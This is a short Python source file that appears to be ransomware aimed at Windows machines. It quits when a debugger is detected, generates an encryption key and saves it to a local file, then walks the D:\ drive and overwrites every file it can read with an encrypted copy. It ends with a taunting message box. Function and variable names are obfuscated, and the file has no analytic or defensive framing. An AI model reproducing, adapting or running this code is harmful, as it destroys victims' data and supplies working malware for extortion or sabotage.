import sys
import os
from cryptography.fernet import Fernet
import ctypes
import win32gui, win32con
import threading

try:
    if ctypes.windll.kernel32.IsDebuggerPresent == 1:
        sys.exit(1)
    KKK = Fernet.generate_key()
    try:
        FOPOPOPOPOP14 = open("cacat_mare.nig", "wb")
        FOPOPOPOPOP14.write(KKK)
        FOPOPOPOPOP14.close()
    except Exception as e:
        print(e)

    def chart_Viewr(hHandle):
        try:
            try:
                try:
                    for R, d, fd in os.walk(hHandle):
                        for f in fd:
                            try:
                                FOP = os.path.join(R, f)

                                FTO = open(FOP, "rb")
                                DDF32432 = FTO.read()
                                FTO.close()

                                CT = Fernet(KKK).encrypt(DDF32432)

                                sFILE = open(FOP, "wb")
                                sFILE.write(CT)
                                sFILE.close()
                            except PermissionError:
                                pass
                except Exception as e:
                    print(e)
            except MemoryError:
                pass
        except MemoryError:
            pass
    def yeyfwfgdufweugfusfuygsj____() -> int:
        T197193 = threading.Thread(target = chart_Viewr, args=("D:\\",))
        T197193.start()

        win32gui.MessageBox(0, "Look On Your Desktop :)", "Look On Your Desktop :)", win32con.MB_WARNING)
        return 1
    yeyfwfgdufweugfusfuygsj____()
except Exception as e:
    print(e)
